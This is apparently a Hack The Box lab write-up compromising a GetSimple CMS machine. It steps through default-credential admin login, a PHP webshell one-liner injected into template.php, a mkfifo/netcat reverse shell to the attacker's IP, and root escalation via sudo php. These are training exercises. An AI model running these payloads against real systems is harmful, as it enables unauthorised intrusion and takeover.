# HTB — Getting Started Writeup

**Target:** `10.129.42.249`  
**Attacker:** `10.10.14.50`  
**CMS:** GetSimple CMS 3.3.15  
**OS:** Linux (Ubuntu))

---

## 1. Recon

```bash
ping 10.129.42.249        # host alive, TTL=63 (Linux)
nmap -sV -sC 10.129.42.249
```

Two ports open:

| Port | Service |
|------|---------|
| 22   | OpenSSH 8.2p1 |
| 80   | Apache 2.4.41 — GetSimple CMS |

Nmap also pulled `robots.txt` which disallowed `/admin/` — noted.

---

## 2. Web Enumeration

```bash
gobuster dir -u http://10.129.42.249/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
  -x php,txt
```

Relevant hits: `/admin`, `/data`, `/plugins`, `/theme`, `/backups`, `/readme.txt`.

---

## 3. Admin Access — Default Credentials

Navigated to `http://10.129.42.249/admin`. Checked common defaults for GetSimple CMS — logged straight in without brute-forcing.

From the admin panel I checked the **Files** tab to upload a webshell, but file upload was broken. Pivoted to the **Theme** editor instead.

---

## 4. Webshell Injection via Theme Editor

In the Theme editor I opened `template.php` and injected a one-liner at the top:

```php
<?php system($_GET['cmd']); ?>
```

Saved the file, then confirmed RCE:

```
http://10.129.42.249/theme/Innovation/template.php?cmd=whoami
```

Output: `www-data`. RCE confirmed.

---

## 5. Reverse Shell

Set up the listener:

```bash
nc -lvnp 4444
```

The bash reverse shell via URL encoding failed — `bash -i >& /dev/tcp/...` didn't trigger. Used a mkfifo payload instead, which worked:

```bash
curl "http://10.129.42.249/theme/Innovation/template.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.50+4444+>/tmp/f"
```

Decoded:
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.50 4444 >/tmp/f
```

Shell caught as `www-data`.

---

## 6. Shell Stabilization

```bash
# In the shell:
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Ctrl+Z, then on attacker:
stty raw -echo; fg

# Back in shell:
export TERM=xterm
```

---

## 7. Privilege Escalation

```bash
sudo -l
```

```
(ALL : ALL) NOPASSWD: /usr/bin/php
```

`www-data` can run `php` as root with no password. One command to root:

```bash
sudo php -r "system('/bin/bash');"
```

Root shell.

---

## 8. Flags

```bash
find / -name "user.txt" 2>/dev/null   # → /home/mrb3n/user.txt
cat /home/mrb3n/user.txt
```
`[redacted]`

```bash
find / -name "root.txt" 2>/dev/null   # → /root/root.txt
cat ~/root.txt
```
`[redacted]`

---

## Attack Chain Summary

| Step | Action |
|------|--------|
| Recon | nmap — ports 22, 80; GetSimple CMS identified |
| Enumeration | gobuster — found `/admin`, `/theme` |
| Access | Default credentials → admin panel |
| Webshell | Theme editor → `template.php` → `<?php system($_GET['cmd']); ?>` |
| RCE | `?cmd=whoami` confirmed |
| Shell | mkfifo reverse shell (bash via URL failed) |
| PrivEsc | `sudo php -r "system('/bin/bash');"` — php in sudoers, no password |
